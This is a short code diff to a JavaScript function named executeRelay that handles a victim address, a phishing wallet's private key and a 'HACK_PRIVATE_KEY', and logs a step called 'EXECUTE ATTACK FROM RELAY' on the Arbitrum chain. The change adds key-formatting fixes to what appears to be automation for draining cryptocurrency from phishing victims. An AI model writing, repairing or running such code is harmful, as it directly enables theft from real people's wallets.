@@ -21,10 +21,22 @@ dotenv.config();
  */
 export async function executeRelay({ victimAddress, phishingAddress, phishingPrivateKey, fundAmount = '0.00002' }) {
     const ALCHEMY_RPC = process.env.ALCHEMY_RPC;
-    const HACK_PRIVATE_KEY = process.env.HACK_PRIVATE_KEY;
+    let HACK_PRIVATE_KEY = process.env.HACK_PRIVATE_KEY;
 
-    if (!ALCHEMY_RPC || !HACK_PRIVATE_KEY) {
-        throw new Error('Missing ALCHEMY_RPC or HACK_PRIVATE_KEY in environment variables.');
+    // Ensure HACK_PRIVATE_KEY is a valid hex string starting with 0x
+    if (HACK_PRIVATE_KEY && !HACK_PRIVATE_KEY.startsWith('0x')) {
+        HACK_PRIVATE_KEY = `0x${HACK_PRIVATE_KEY}`;
+    }
+    HACK_PRIVATE_KEY = HACK_PRIVATE_KEY?.trim();
+
+    // Ensure phishingPrivateKey is a valid hex string starting with 0x
+    let formattedPhishingKey = phishingPrivateKey?.trim();
+    if (formattedPhishingKey && !formattedPhishingKey.startsWith('0x')) {
+        formattedPhishingKey = `0x${formattedPhishingKey}`;
+    }
+
+    if (!ALCHEMY_RPC || !HACK_PRIVATE_KEY || HACK_PRIVATE_KEY.includes('your_master')) {
+        throw new Error('Missing or invalid HACK_PRIVATE_KEY in environment variables.');
     }
 
     console.log(`[Relay] Starting automation for victim: ${victimAddress}`);
@@ -58,7 +70,7 @@ export async function executeRelay({ victimAddress, phishingAddress, phishingPri
 
     // --- STEP 2: EXECUTE ATTACK FROM RELAY ---
     console.log('[Relay] Step 2: Executing target transaction...');
-    const relayAccount = privateKeyToAccount(phishingPrivateKey);
+    const relayAccount = privateKeyToAccount(formattedPhishingKey);
     const relayClient = createWalletClient({
         account: relayAccount,
         chain: arbitrum,
